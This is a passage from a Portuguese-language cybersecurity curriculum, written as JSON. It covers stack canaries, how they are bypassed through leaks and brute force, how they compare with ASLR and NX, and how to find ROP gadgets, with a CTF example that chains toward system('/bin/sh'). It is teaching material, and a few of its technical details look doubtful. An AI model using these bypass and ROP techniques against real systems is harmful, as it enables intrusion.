                                  "tips": "Busque por 'canary' ou 'cookie' nas saídas para confirmação.",
                                  "learningObjective": "Capacitar a interpretação precisa de erros de canário para diagnóstico de vulnerabilidades.",
                                  "commonMistakes": [
                                    "Confundir stack smashing com segfault genérico",
                                    "Não correlacionar GDB e Valgrind",
                                    "Ignorar ASLR/fortify impacts"
                                  ]
                                }
                              ],
                              "practicalExample": "Em um programa 'vulneravel.c' com função void overflow(char* input) { char buf[64]; strcpy(buf, input); }, compile com -fstack-protector-all. Ao executar ./vulneravel $(python -c 'print(\"A\"*100)') no GDB, observe 'Program received signal SIGABRT: *** stack smashing detected *** terminated', e no Valgrind: 'Invalid write of size 1 at buffer address', confirmando corrupção do canário.",
                              "finalVerifications": [
                                "Identifica corretamente '*** stack smashing detected ***' como falha de canário.",
                                "Explica o papel do canário na detecção de overflow.",
                                "Diferencia saídas de GDB (abort) vs. Valgrind (memcheck details).",
                                "Reproduz o erro consistentemente em múltiplas execuções.",
                                "Documenta endereços e tamanhos envolvidos na violação.",
                                "Contrasta com execução sem proteção."
                              ],
                              "assessmentCriteria": [
                                "Precisão na identificação da mensagem de erro específica.",
                                "Correta interpretação do mecanismo de detecção (canário corrompido).",
                                "Uso correto de comandos GDB e Valgrind.",
                                "Análise comparativa entre ferramentas.",
                                "Relatório claro com causas, evidências e implicações.",
                                "Ausência de erros comuns como confusão com outros crashes."
                              ],
                              "crossCurricularConnections": [
                                "Programação em Linguagem C: Manipulação de strings e buffers.",
                                "Sistemas Operacionais: Gerenciamento de pilha e proteções ASLR/Pie.",
                                "Análise de Vulnerabilidades: Buffer overflows em pentesting.",
                                "Engenharia de Software: Boas práticas de depuração e logging."
                              ],
                              "realWorldApplication": "Em auditorias de segurança de software e análise de malware, profissionais usam GDB/Valgrind para diagnosticar buffer overflows em binários legados, prevenindo exploits como shellcode injection em aplicações críticas como servidores web ou firmwares embarcados."
                            },
                            "estimatedTime": "1.5 horas",
                            "difficulty": "advanced",
                            "status": "not_started",
                            "prerequisites": []
                          }
                        ]
                      },
                      {
                        "id": "10.1.1.5.3",
                        "name": "Geração Aleatória e Limitações dos Canários",
                        "description": "Uso de valores pseudoaleatórios para dificultar adivinhação e técnicas de bypass, além de limitações em cenários específicos como format strings ou heap overflows.",
                        "specificSkills": [
                          {
                            "id": "10.1.1.5.3.1",
                            "name": "Entender a geração de canários aleatórios",
                            "description": "Explicar como o sistema operacional ou bibliotecas como glibc geram canários usando funções PRNG (Pseudo-Random Number Generators) em inicialização do processo.",
                            "atomicExpansion": {
                              "steps": [
                                {
                                  "stepNumber": 1,
                                  "title": "Compreender os Fundamentos de Geradores Pseudo-Aleatórios (PRNG)",
                                  "subSteps": [
                                    "Estude a diferença entre números verdadeiramente aleatórios e pseudo-aleatórios, focando em sementes (seeds) iniciais.",
                                    "Analise algoritmos comuns de PRNG como Linear Congruential Generator (LCG) ou Mersenne Twister usados em bibliotecas como glibc.",
                                    "Explore como PRNGs produzem sequências determinísticas baseadas em uma semente inicial.",
                                    "Identifique fontes de entropia para sementes, como /dev/urandom no Linux.",
                                    "Pratique gerando números pseudo-aleatórios em C usando rand() e srand()."
                                  ],
                                  "verification": "Explique verbalmente ou por escrito como um PRNG funciona com um exemplo de código simples que gera 10 números aleatórios.",
                                  "estimatedTime": "45 minutos",
                                  "materials": [
                                    "Documentação glibc rand(3)",
                                    "Compilador GCC",
                                    "Ambiente Linux com man pages"
                                  ],
                                  "tips": "Sempre inicialize a semente com tempo ou entropia para evitar sequências previsíveis.",
                                  "learningObjective": "Dominar os princípios de PRNGs e sua predictibilidade.",
                                  "commonMistakes": [
                                    "Confundir PRNG com RNG criptográfico",
                                    "Não semear o gerador",
                                    "Ignorar overflow em cálculos de LCG"
                                  ]
                                },
                                {
                                  "stepNumber": 2,
                                  "title": "Explorar Fontes de Entropia no Sistema Operacional",
                                  "subSteps": [
                                    "Investigue dispositivos como /dev/random e /dev/urandom no Linux e como eles coletam entropia de hardware (teclado, mouse, interrupções).",
                                    "Leia sobre o pool de entropia mantido pelo kernel Linux em /proc/sys/kernel/random/entropy_avail.",
                                    "Compare entropia em inicialização do sistema vs. runtime.",
                                    "Teste lendo bytes de /dev/urandom em um script shell e analise variabilidade.",
                                    "Entenda como glibc usa getrandom() ou similares para acessar entropia."
                                  ],
                                  "verification": "Monitore o pool de entropia com 'cat /proc/sys/kernel/random/entropy_avail' antes e depois de ler /dev/urandom, registrando mudanças.",
                                  "estimatedTime": "30 minutos",
                                  "materials": [
                                    "Terminal Linux",
                                    "Comando cat e watch",
                                    "Documentação kernel.org sobre random"
                                  ],
                                  "tips": "Use 'rngd' daemon para melhorar entropia em VMs se necessário.",
                                  "learningObjective": "Identificar e medir fontes de entropia usadas para sementes de canários.",
                                  "commonMistakes": [
                                    "Achar que /dev/random é sempre bloqueante",
                                    "Ignorar depleção de entropia em boot",
                                    "Confundir urandom com random"
                                  ]
                                },
                                {
                                  "stepNumber": 3,
                                  "title": "Analisar o Processo de Geração de Canários em glibc",
                                  "subSteps": [
                                    "Estude o código-fonte de glibc em pt-thread-stack-minimal.c ou __stack_chk_guard para ver como PTRACE_getregs e entropia geram canários.",
                                    "Compile um programa C simples com -fstack-protector e use objdump para inspecionar a seção de dados do canário.",
                                    "Use GDB para breakpoint em _init e inspecione o valor de __stack_chk_guard antes e após inicialização.",
                                    "Trace a chamada para getrandom() ou arc4random() durante init do processo.",
                                    "Compare canários gerados em múltiplas execuções para verificar aleatoriedade."
                                  ],
                                  "verification": "Execute o programa 5 vezes com GDB, capture valores de __stack_chk_guard e confirme que variam entre runs.",
                                  "estimatedTime": "60 minutos",
                                  "materials": [
                                    "GCC com -fstack-protector",
                                    "GDB debugger",
                                    "Fonte glibc (github.com/lattera/glibc ou oficial)"
                                  ],
                                  "tips": "Defina ulimit -c unlimited para core dumps se crashes ocorrerem.",
                                  "learningObjective": "Mapear o fluxo exato de geração de canários na inicialização.",
                                  "commonMistakes": [
                                    "Não recompilar com proteções",
                                    "Confundir canário stack com outros guards",
                                    "Ignorar ASLR impacto"
                                  ]
                                },
                                {
                                  "stepNumber": 4,
                                  "title": "Avaliar Limitações e Previsibilidade dos Canários",
                                  "subSteps": [
                                    "Discuta ataques como cache-timing ou branch prediction que podem vazar canários apesar de PRNG.",
                                    "Teste fork() em processos: verifique se filhos herdam o mesmo canário do pai.",
                                    "Analise cenários de baixa entropia no boot (ex: containers Docker).",
                                    "Compare com alternativas como stack cookies com entropia por thread.",
                                    "Pesquise CVEs relacionados a canários previsíveis (ex: fork bombs)."
                                  ],
                                  "verification": "Crie um programa pai-filho com fork(), inspecione canários em ambos e documente se são idênticos.",
                                  "estimatedTime": "45 minutos",
                                  "materials": [
                                    "Código de teste com fork()",
                                    "GDB",
                                    "Docker para simular baixa entropia"
                                  ],
                                  "tips": "Use strace para tracear syscalls de random durante fork.",
                                  "learningObjective": "Reconhecer fraquezas na geração de canários PRNG-based.",
                                  "commonMistakes": [
                                    "Achar canários 'perfeitamente aleatórios'",
                                    "Ignorar herança em fork",
                                    "Subestimar ataques side-channel"
                                  ]
                                }
                              ],
                              "practicalExample": "Compile um programa C com buffer na stack: gcc -fstack-protector-all test.c -o test. Execute com GDB: gdb ./test, set breakpoint em main, examine $__stack_chk_guard após _init. Sobrescreva buffer intencionalmente para trigger SIGABRT e veja o canário mismatch. Repita execuções para ver variação do valor.",
                              "finalVerifications": [
                                "Explicar o fluxo completo: entropia -> PRNG seed -> canário em __stack_chk_guard.",
                                "Demonstrar com GDB que canário varia entre execuções independentes.",
                                "Identificar que fork() herda o mesmo canário, criando vulnerabilidade.",
                                "Descrever limitações em baixa entropia ou ataques side-channel.",
                                "Gerar e comparar 10 canários manualmente via código glibc-like.",
                                "Discutir impacto de ASLR na efetividade."
                              ],
                              "assessmentCriteria": [
                                "Precisão na descrição do papel de /dev/urandom e getrandom() (90%+ correto).",
                                "Código de teste funcional que captura e exibe canários variáveis.",
                                "Análise correta de herança em fork() com evidência empírica.",
                                "Identificação de pelo menos 3 limitações reais com referências.",
                                "Explicação clara de PRNG vs. CSPRNG no contexto de canários.",
                                "Uso correto de ferramentas como GDB e objdump sem erros."
                              ],
                              "crossCurricularConnections": [
                                "Matemática: Probabilidade e teoria dos números em algoritmos PRNG.",
                                "Programação: Depuração avançada com GDB e análise de binários.",
                                "Sistemas Operacionais: Gerenciamento de entropia no kernel.",
                                "Criptografia: Diferenças entre PRNG e geradores criptográficos seguros."
                              ],
                              "realWorldApplication": "Em desenvolvimento de software seguro, entender isso permite auditar proteções de stack contra buffer overflows em apps como servidores web (ex: Apache), evitando exploits como em CVE-2010-3847 onde canários fork-herdados foram explorados em ataques DoS."
                            },
                            "estimatedTime": "0.5 hora",
                            "difficulty": "intermediate",
                            "status": "not_started",
                            "prerequisites": []
                          },
                          {
                            "id": "10.1.1.5.3.2",
                            "name": "Identificar técnicas comuns de bypass",
                            "description": "Analisar vetores de bypass como vazamento de canário via informações de ASLR parcial ou ataques de força bruta em canários de 32 bits, referenciando literatura como Pfleeger.",
                            "atomicExpansion": {
                              "steps": [
                                {
                                  "stepNumber": 1,
                                  "title": "Compreender os Fundamentos e Limitações dos Canários",
                                  "subSteps": [
                                    "Estude a estrutura de um canário: bytes aleatórios gerados em tempo de compilação ou execução para detectar overflows.",
                                    "Analise limitações como reutilização em processos filhos, canários de 32 bits (2^32 possibilidades) e dependência de ASLR.",
                                    "Revise o papel do ASLR parcial em expor informações sobre o canário via leaks indiretos.",
                                    "Leia trechos introdutórios de Pfleeger sobre proteções de stack e suas fraquezas.",
                                    "Anote as entropias típicas: 32 bits vs 64 bits."
                                  ],
                                  "verification": "Resuma em 3-5 pontos as limitações principais dos canários e cite exemplos de entropia insuficiente.",
                                  "estimatedTime": "45 minutos",
                                  "materials": [
                                    "Livro 'Security in Computing' de Pfleeger (capítulos sobre proteções de memória)",
                                    "Documentação GCC sobre stack canaries (--stack-protector)"
                                  ],
                                  "tips": "Use diagramas para visualizar a inserção do canário na stack frame.",
                                  "learningObjective": "Identificar as bases técnicas que tornam os canários vulneráveis a bypass.",
                                  "commonMistakes": "Confundir canários com ASLR completo; lembre que ASLR é parcial em muitos sistemas."
                                },
                                {
                                  "stepNumber": 2,
                                  "title": "Analisar Vazamento de Canário via Informações de ASLR Parcial",
                                  "subSteps": [
                                    "Entenda como leaks de endereços (ex: via format strings ou info leaks) revelam XOR com ASLR base.",
                                    "Simule um cenário: obtém endereço de função próxima ao canário, deduce offset fixo do canário.",
                                    "Estude exemplos de PoCs em CTFs onde ASLR parcial permite reconstruir o canário byte a byte.",
                                    "Compare com leaks diretos vs indiretos, referenciando vetores como return-oriented programming (ROP).",
                                    "Teste conceitualmente com pseudocódigo de reconstrução."
                                  ],
                                  "verification": "Descreva um fluxo de ataque passo a passo para vazamento via ASLR parcial.",
                                  "estimatedTime": "60 minutos",
                                  "materials": [
                                    "Ferramentas como gdb ou pwndbg para inspeção de stack",
                                    "Artigos Phrack ou Black Hat sobre info leaks"
                                  ],
                                  "tips": "Foquem em offsets relativos; ASLR não randomiza tudo igualmente.",
                                  "learningObjective": "Mapear como ASLR parcial facilita vazamentos de canários em exploits reais.",
                                  "commonMistakes": "Ignorar que ASLR vaza bits altos; teste com 'cat /proc/self/maps' para ver."
                                },
                                {
                                  "stepNumber": 3,
                                  "title": "Explorar Ataques de Força Bruta em Canários de 32 Bits",
                                  "subSteps": [
                                    "Calcule a viabilidade: 2^32 tentativas ~4 bilhões, factível em <1 dia com 1000 crashes/segundo.",
                                    "Discuta cenários onde crashes são silenciosos ou rate-limitados não aplicam (ex: processos multi-threaded).",
                                    "Analise implementações legadas em SOs antigos ou binários sem full randomization.",
                                    "Revise mitigações modernas como canários de 64 bits e stack clash protections.",
                                    "Simule timing attacks ou brute-force paralelo."
                                  ],
                                  "verification": "Calcule tempo estimado para brute-force de 32 bits e liste 3 condições que o tornam prático.",
                                  "estimatedTime": "50 minutos",
                                  "materials": [
                                    "Calculadora ou script Python para probabilidades",
                                    "Referências CVE com brute-force canary (ex: CVE-2010-xxx)"
                                  ],
                                  "tips": "Use multiprocessing para simular velocidade de brute-force.",
                                  "learningObjective": "Quantificar riscos de baixa entropia em canários de 32 bits.",
                                  "commonMistakes": "Subestimar taxa de crashes; benchmarks reais mostram >10k/s em hardware moderno."
                                },
                                {
                                  "stepNumber": 4,
                                  "title": "Sintetizar Técnicas Adicionais e Referenciar Literatura",
                                  "subSteps": [
                                    "Liste outras bypass: cache side-channels, just-in-time generation leaks, ou bypass via signal handlers.",
                                    "Compare técnicas em tabela: complexidade, requisitos, sucesso em wild.",
                                    "Estude Pfleeger para contexto histórico e evoluções pós-canário.",
                                    "Crie um mindmap conectando bypass a chains maiores (ex: ROP após bypass).",
                                    "Discuta defesas: SSP-all, CET shadows stacks."
                                  ],
                                  "verification": "Produza uma tabela comparativa de 4+ técnicas de bypass com prós/contras.",
                                  "estimatedTime": "40 minutos",
                                  "materials": [
                                    "Pfleeger 5ª ed. (Seção 10.3)",
                                    "Blog posts de projetos como StackGuard"
                                  ],
                                  "tips": "Priorize técnicas com PoCs públicos para validação.",
                                  "learningObjective": "Integrar múltiplas técnicas em um framework de identificação de bypass.",
                                  "commonMistakes": "Focar só em teoria; sempre busque CVEs reais para grounding."
                                }
                              ],
                              "practicalExample": "Em um buffer overflow local, use um format string para leakar endereço de uma variável próxima ao canário. Deduza o canário via offset fixo (ex: canário em RSP+0x28), bypassando a checagem e pivotando para ROP chain, como demonstrado em exploits para binários com -fstack-protector.",
                              "finalVerifications": [
                                "Explicar corretamente 3 limitações de canários com cálculos de entropia.",
                                "Desenhar um diagrama de stack mostrando inserção e bypass via leak.",
                                "Listar 4 técnicas de bypass com vetores específicos.",
                                "Citar Pfleeger ou CVE relevante para cada técnica.",
                                "Simular um brute-force timing em pseudocódigo.",
                                "Identificar mitigações modernas que previnem cada bypass."
                              ],
                              "assessmentCriteria": [
                                "Precisão técnica: Correção em descrições de vetores (90%+).",
                                "Profundidade: Inclusão de sub-passos e cálculos quantitativos.",
                                "Aplicação prática: Exemplos com PoCs ou diagramas claros.",
                                "Referenciação: Uso adequado de fontes como Pfleeger.",
                                "Síntese: Capacidade de conectar técnicas em chains de exploit.",
                                "Criatividade: Identificação de variações não listadas explicitamente."
                              ],
                              "crossCurricularConnections": [
                                "Programação de Baixo Nível: Assembly e manipulação de stack em C.",
                                "Criptografia: Entropia e geração de random numbers seguros.",
                                "Matemática: Probabilidades e complexidade computacional em brute-force.",
                                "Análise de Sistemas Operacionais: ASLR, SSP e proteções kernel."
                              ],
                              "realWorldApplication": "Em pentests e bug bounties, identificar bypass de canários permite chainar exploits em serviços como web servers vulneráveis (ex: Apache modules), avaliando riscos em auditorias de software legado e recomendando upgrades para proteções como Control-flow Enforcement Technology (CET)."
                            },
                            "estimatedTime": "1 hora",
                            "difficulty": "advanced",
                            "status": "not_started",
                            "prerequisites": []
                          },
                          {
                            "id": "10.1.1.5.3.3",
                            "name": "Comparar com outras proteções de memória",
                            "description": "Relacionar canários com ASLR e NX/DEP, destacando que canários protegem especificamente a integridade da pilha contra overflows lineares.",
                            "atomicExpansion": {
                              "steps": [
                                {
                                  "stepNumber": 1,
                                  "title": "Revisar o Funcionamento dos Canários na Proteção de Pilha",
                                  "subSteps": [
                                    "Relembre que canários são valores aleatórios inseridos pelo compilador entre variáveis locais e o endereço de retorno na pilha.",
                                    "Entenda que eles detectam overflows de buffer lineares ao verificar se o valor foi alterado antes de retornar da função.",
                                    "Identifique limitações: protegem apenas contra corrupções lineares na pilha, não contra ataques não-lineares ou ROP.",
                                    "Examine código assembly gerado por GCC com -fstack-protector para visualizar a inserção do canário.",
                                    "Teste um exemplo simples de overflow sem e com canário usando um depurador como GDB."
                                  ],
                                  "verification": "Explique verbalmente ou por escrito como um canário previne a sobrescrita do endereço de retorno em um overflow linear.",
                                  "estimatedTime": "30 minutos",
                                  "materials": [
                                    "Documentação GCC Stack Protector",
                                    "GDB tutorial",
                                    "Exemplo de código C com buffer overflow"
                                  ],
                                  "tips": "Use o flag -fstack-protector-all para forçar canários em todas as funções durante testes.",
                                  "learningObjective": "Compreender precisamente o mecanismo e escopo de proteção dos canários.",
                                  "commonMistakes": "Confundir canários com randomização de endereços; canários não randomizam, apenas verificam integridade."
                                },
                                {
                                  "stepNumber": 2,
                                  "title": "Estudar ASLR (Address Space Layout Randomization)",
                                  "subSteps": [
                                    "Defina ASLR: técnica que randomiza posições de base de segmentos de memória (pilha, heap, bibliotecas) a cada execução.",
                                    "Descreva como ASLR complica exploits baseados em endereços fixos, como ret2libc ou ROP chains.",
                                    "Diferencie níveis de ASLR: parcial (32-bit) vs. full (64-bit com KASLR).",
                                    "Compare com canários: ASLR previne adivinhação de endereços, mas não detecta corrupção de pilha diretamente.",
                                    "Desative ASLR temporariamente com 'setarch -R' no Linux e observe diferenças em um exploit."
                                  ],
                                  "verification": "Demonstre desabilitando ASLR e executando um exploit que falha com ASLR ativado.",
                                  "estimatedTime": "45 minutos",
                                  "materials": [
                                    "Artigo Phrack sobre ASLR",
                                    "Comando setarch no Linux",
                                    "Exemplo de exploit ret2libc"
                                  ],
                                  "tips": "Verifique status de ASLR com 'cat /proc/sys/kernel/randomize_va_space' (2=full).",
                                  "learningObjective": "Dominar como ASLR randomiza memória para mitigar exploits de controle de fluxo.",
                                  "commonMistakes": "Achar que ASLR protege integridade de dados; ele só randomiza layout, não verifica corrupção."
                                },
                                {
                                  "stepNumber": 3,
                                  "title": "Analisar NX/DEP (No eXecute / Data Execution Prevention)",
                                  "subSteps": [
                                    "Explique NX/DEP: bit de hardware (NX em AMD, XD em Intel) que marca páginas de memória como não-executáveis.",
                                    "Descreva como previne execução de código injetado em pilha/heap via overflows.",
                                    "Discuta bypasses como ROP (Return-Oriented Programming) que usam gadgets existentes.",
                                    "Compare com canários: NX previne execução, canários previnem controle de fluxo via sobrescrita de retorno.",
                                    "Teste em código C com mprotect() ou verifique em GDB com 'info proc mappings'."
                                  ],
                                  "verification": "Crie um shellcode simples e mostre que falha em executar com NX ativado.",
                                  "estimatedTime": "45 minutos",
                                  "materials": [
                                    "Documentação Microsoft DEP",
                                    "Intel/AMD manuals sobre NX/XD",
                                    "Exemplo ROP gadget finder"
                                  ],
                                  "tips": "Use 'execstack -s' para tornar pilha executável em testes controlados.",
                                  "learningObjective": "Entender o papel de NX/DEP na prevenção de execução de código malicioso em dados.",
                                  "commonMistakes": "Confundir NX com proteção de escrita; NX é sobre execução, não escrita."
                                },
                                {
                                  "stepNumber": 4,
                                  "title": "Comparar e Contrastar Canários, ASLR e NX/DEP",
                                  "subSteps": [
                                    "Crie uma tabela comparativa: escopo (pilha vs. todo espaço), tipo de ataque mitigado, limitações.",
                                    "Destaque: canários protegem integridade da pilha contra overflows lineares; ASLR randomiza endereços; NX previne execução.",
                                    "Discuta camadas complementares: todos juntos formam defesas em profundidade.",
                                    "Analise cenários: overflow linear detectado por canário, mas ROP pode bypassar ASLR/NX.",
                                    "Resuma vantagens: canários são baratos e específicos; outros são mais amplos mas bypassáveis."
                                  ],
                                  "verification": "Preencha e explique uma tabela de comparação em um documento ou apresentação.",
                                  "estimatedTime": "60 minutos",
                                  "materials": [
                                    "Planilha Google Sheets ou Markdown table",
                                    "Artigos sobre mitigações modernas"
                                  ],
                                  "tips": "Use diagramas visuais da pilha para ilustrar diferenças em ataques.",
                                  "learningObjective": "Sintetizar diferenças e sinergias entre as proteções de memória.",
                                  "commonMistakes": "Generalizar que uma protege tudo; cada tem escopo específico."
                                }
                              ],
                              "practicalExample": "Em um servidor web vulnerável a stack overflow (ex: antigo Heartbleed-like), um atacante tenta injetar shellcode. Canário detecta e crasha antes de retornar; ASLR faz gadgets ROP imprevisíveis; NX impede execução direta do shellcode. Sem canário, ASLR/NX ainda mitigam, mas canário previne o primeiro passo linear.",
                              "finalVerifications": [
                                "Explique por que canários não protegem contra ROP, mas ASLR dificulta.",
                                "Descreva um ataque que bypassa NX mas é parado por canário.",
                                "Compare overhead: canários (~1-2% CPU) vs. ASLR (randomização em fork).",
                                "Identifique quando desabilitar cada proteção em debugging.",
                                "Crie diagrama mostrando pilha com/ sem cada proteção.",
                                "Liste 3 exploits famosos mitigados por cada."
                              ],
                              "assessmentCriteria": [
                                "Precisão na distinção de escopos: canários (integridade pilha linear), ASLR (layout), NX (execução).",
                                "Uso de exemplos concretos com código ou diagramas.",
                                "Identificação correta de limitações e bypasses.",
                                "Demonstração de testes práticos (GDB, setarch).",
                                "Síntese em tabela comparativa clara e completa.",
                                "Compreensão de defesas em profundidade."
                              ],
                              "crossCurricularConnections": [
                                "Programação em C/Assembly: entender geração de código com proteções.",
                                "Sistemas Operacionais: configuração de kernel (sysctl para ASLR).",
                                "Arquitetura de Computadores: bits NX em paginamento MMU.",
                                "Análise de Malware: estudo de exploits reais como Code Red."
                              ],
                              "realWorldApplication": "Desenvolvedores ativam essas proteções por padrão (GCC Clang flags, Windows CFG); pentesters testam bypasses em bug bounties; em produção, logs de canário crashes alertam sobre tentativas de overflow em apps como Apache ou browsers."
                            },
                            "estimatedTime": "0.5 hora",
                            "difficulty": "intermediate",
                            "status": "not_started",
                            "prerequisites": []
                          }
                        ]
                      }
                    ]
                  },
                  {
                    "id": "10.1.1.6",
                    "name": "Programação Orientada a Retornos (ROP)",
                    "description": "Técnica de construção de exploits reutilizando gadgets de código existente via retornos.",
                    "individualConcepts": [
                      {
                        "id": "10.1.1.6.1",
                        "name": "Gadgets em Programação Orientada a Retornos (ROP)",
                        "description": "Gadgets são sequências curtas de instruções em código existente que terminam com uma instrução de retorno (RET), permitindo reutilizá-las para construir exploits sem injetar novo código.",
                        "specificSkills": [
                          {
                            "id": "10.1.1.6.1.1",
                            "name": "Identificar gadgets ROP em binários",
                            "description": "Analisar binários desmontados para localizar instruções que terminam com RET, utilizando ferramentas como ROPgadget ou objdump, considerando arquitetura x86/x64.",
                            "atomicExpansion": {
                              "steps": [
                                {
                                  "stepNumber": 1,
                                  "title": "Configurar o ambiente de análise de binários",
                                  "subSteps": [
                                    "Instalar binutils (inclui objdump) via apt install binutils em Linux/WSL.",
                                    "Instalar ROPgadget via pip install ROPgadget.",
                                    "Obter um binário de exemplo vulnerável (ex: de picoCTF ou compilar um simples em C sem proteções).",
                                    "Verificar a arquitetura do binário com file binary ou objdump -f binary (x86 ou x64).",
                                    "Testar ferramentas: objdump --version e ROPgadget --help."
                                  ],
                                  "verification": "Ferramentas instaladas e funcionando, binário analisado com arquitetura confirmada.",
                                  "estimatedTime": "15 minutos",
                                  "materials": [
                                    "Linux/WSL ou Kali Linux",
                                    "Python 3 e pip",
                                    "Binário de exemplo (ex: challenge.bin)"
                                  ],
                                  "tips": [
                                    "Use ambiente virtual com virtualenv para pip.",
                                    "Prefira Kali Linux para ferramentas pré-instaladas."
                                  ],
                                  "learningObjective": "Preparar ferramentas e binário para análise ROP segura e eficiente.",
                                  "commonMistakes": [
                                    "Instalar em arquitetura errada (x86 vs x64)",
                                    "Esquecer de desabilitar ASLR com setarch -R para testes"
                                  ]
                                },
                                {
                                  "stepNumber": 2,
                                  "title": "Desmontar o binário manualmente com objdump",
                                  "subSteps": [
                                    "Executar objdump -d -M intel binary > disassembly.txt para desmontagem em Intel syntax.",
                                    "Abrir disassembly.txt e buscar por 'ret' usando grep ' ret$' disassembly.txt.",
                                    "Listar endereços de funções terminando em ret (ex: 0x401000: ret).",
                                    "Identificar gadgets primitivos: pop reg; ret, mov reg, [addr]; ret.",
                                    "Anotar 5-10 endereços potenciais em um arquivo notes.txt."
                                  ],
                                  "verification": "Arquivo com pelo menos 5 endereços de instruções RET anotados corretamente.",
                                  "estimatedTime": "20 minutos",
                                  "materials": [
                                    "Binário de exemplo",
                                    "Editor de texto (vim/nano)",
                                    "grep"
                                  ],
                                  "tips": [
                                    "Use -M intel para syntax legível em x86/x64.",
                                    "Combine com hexdump -C para contexto binário."
                                  ],
                                  "learningObjective": "Localizar manualmente instruções RET em desmontagem para entender estrutura do binário.",
                                  "commonMistakes": [
                                    "Confundir retn com ret",
                                    "Ignorar gadgets multi-instrução",
                                    "Não considerar endianness em x64"
                                  ]
                                },
                                {
                                  "stepNumber": 3,
                                  "title": "Utilizar ROPgadget para encontrar gadgets automaticamente",
                                  "subSteps": [
                                    "Executar ROPgadget --binary binary para lista completa de gadgets.",
                                    "Filtrar por tipo: ROPgadget --binary binary --string 'pop|ret' para gadgets com pop e ret.",
                                    "Executar ROPgadget --binary binary --only 'pop|mov|ret' para gadgets específicos.",
                                    "Salvar saída: ROPgadget --binary binary > gadgets.txt.",
                                    "Comparar com achados manuais do objdump."
                                  ],
                                  "verification": "Lista gerada com pelo menos 10 gadgets ROP únicos, salvos em arquivo.",
                                  "estimatedTime": "15 minutos",
                                  "materials": [
                                    "ROPgadget instalado",
                                    "Binário analisado"
                                  ],
                                  "tips": [
                                    "Adicione --depth 10 para chains mais longas.",
                                    "Use --nosys para ignorar bibliotecas do sistema."
                                  ],
                                  "learningObjective": "Automatizar detecção de gadgets ROP e entender opções da ferramenta.",
                                  "commonMistakes": [
                                    "Executar sem especificar arquitetura (--arch x86)",
                                    "Interpretar falsos positivos como gadgets reais"
                                  ]
                                },
                                {
                                  "stepNumber": 4,
                                  "title": "Analisar e validar gadgets ROP identificados",
                                  "subSteps": [
                                    "Classificar gadgets por utilidade: primitivos (pop rdi; ret), avançados (mov; pop; ret).",
                                    "Testar gadget em debugger: gdb binary, set {reg}=value, x/i $pc para simular.",
                                    "Verificar se gadget evita bad chars ou null bytes.",
                                    "Documentar chain possível: ex: pop rdi; ret -> system call.",
                                    "Exportar lista final com endereços, instruções e uso potencial."
                                  ],
                                  "verification": "Relatório com 5 gadgets analisados, incluindo uso em chain ROP hipotético.",
                                  "estimatedTime": "25 minutos",
                                  "materials": [
                                    "GDB debugger",
                                    "Lista de gadgets do passo anterior"
                                  ],
                                  "tips": [
                                    "Use pwndbg ou gef no GDB para visualização ROP.",
                                    "Considere mitigações como ASLR em análise real."
                                  ],
                                  "learningObjective": "Avaliar utilidade de gadgets em exploits ROP reais.",
                                  "commonMistakes": [
                                    "Assumir gadget funciona sem testar em debugger",
                                    "Ignorar alinhamento de stack em x64"
                                  ]
                                },
                                {
                                  "stepNumber": 5,
                                  "title": "Documentar e revisar descobertas",
                                  "subSteps": [
                                    "Compilar relatório: endereços, instruções, arquitetura, ferramentas usadas.",
                                    "Comparar ROPgadget vs objdump: prós/contras.",
                                    "Testar em binário diferente para generalização.",
                                    "Identificar limitações (ex: gadgets em .plt).",
                                    "Preparar apresentação ou quiz de verificação."
                                  ],
                                  "verification": "Relatório completo com análise comparativa e testes em 2 binários.",
                                  "estimatedTime": "15 minutos",
                                  "materials": [
                                    "Arquivos de saída anteriores",
                                    "Binário secundário"
                                  ],
                                  "tips": [
                                    "Use Markdown para relatório legível.",
                                    "Salve binários com hash para reprodutibilidade."
                                  ],
                                  "learningObjective": "Sintetizar análise ROP em documentação acionável.",
                                  "commonMistakes": [
                                    "Não documentar contexto de arquitetura",
                                    "Sobrestimar gadgets raros"
                                  ]
                                }
                              ],
                              "practicalExample": "Em um desafio CTF com binário 'vuln_x64', execute ROPgadget --binary vuln_x64 --only 'pop|ret' e identifique '0x0000000000400523 : pop rdi ; ret' para preparar chain ROP que chama system('/bin/sh'). Valide no GDB simulando stack overflow.",
                              "finalVerifications": [
                                "Lista pelo menos 10 gadgets ROP de um binário x86/x64 usando ROPgadget.",
                                "Identifica manualmente 5 instruções RET via objdump.",
                                "Explica e testa um gadget pop rdi; ret em GDB.",
                                "Diferencia gadgets primitivos de avançados.",
                                "Documenta chain ROP simples com 3 gadgets.",
                                "Compara achados manuais vs automáticos.",
                                "Aplica em binário novo sem erros."
                              ],
                              "assessmentCriteria": [
                                "Precisão na localização de RET (100% match com ROPgadget).",
                                "Profundidade de substeps completados (mínimo 4 por step).",
                                "Correta classificação de gadgets por utilidade.",
                                "Validação prática em debugger sem crashes.",
                                "Relatório claro com endereços hexadecimais.",
                                "Consideração de arquitetura x86 vs x64.",
                                "Tempo dentro do estimado total (90 minutos)."
                              ],
                              "crossCurricularConnections": [
                                "Linguagem Assembly (x86/x64 instructions).",
                                "Engenharia Reversa (disassembly e debugging).",
                                "Desenvolvimento de Exploits (ROP chains).",
                                "Sistemas Operacionais (proteções como DEP/NX).",
                                "Programação em C (compilação sem proteções)."
                              ],
                              "realWorldApplication": "Em pentests e red teaming, identificar gadgets ROP permite construir exploits para bypassar DEP em binários vulneráveis a buffer overflows, avaliando efetividade de mitigações de memória em aplicações reais como serviços web ou firmwares."
                            },
                            "estimatedTime": "2 horas",
                            "difficulty": "intermediate",
                            "status": "not_started",
                            "prerequisites": []
                          },
                          {
                            "id": "10.1.1.6.1.2",
                            "name": "Classificar tipos de gadgets ROP",
                            "description": "Diferenciar gadgets primitivos (POP RET), funcionais (chamadas a funções como system()) e compostos, avaliando seu impacto em ataques de controle de fluxo.",
                            "atomicExpansion": {
                              "steps": [
                                {
                                  "stepNumber": 1,
                                  "title": "Compreender os Fundamentos de Gadgets ROP",
                                  "subSteps": [
                                    "Estude a definição de gadgets ROP como sequências curtas de instruções em código existente.",
                                    "Revise o papel dos gadgets em cadeias ROP para bypass de proteções como DEP/NX.",
                                    "Analise exemplos básicos de gadgets em assembly (ex: POP RET).",
                                    "Identifique onde gadgets são extraídos: seções .text de binários.",
                                    "Pratique visualizando gadgets com ferramentas como objdump."
                                  ],
                                  "verification": "Liste corretamente 3 componentes essenciais de um gadget ROP e explique seu propósito.",
                                  "estimatedTime": "30 minutos",
                                  "materials": [
                                    "Objdump",
                                    "Documentação ROPgadget",
                                    "Binário ELF vulnerável"
                                  ],
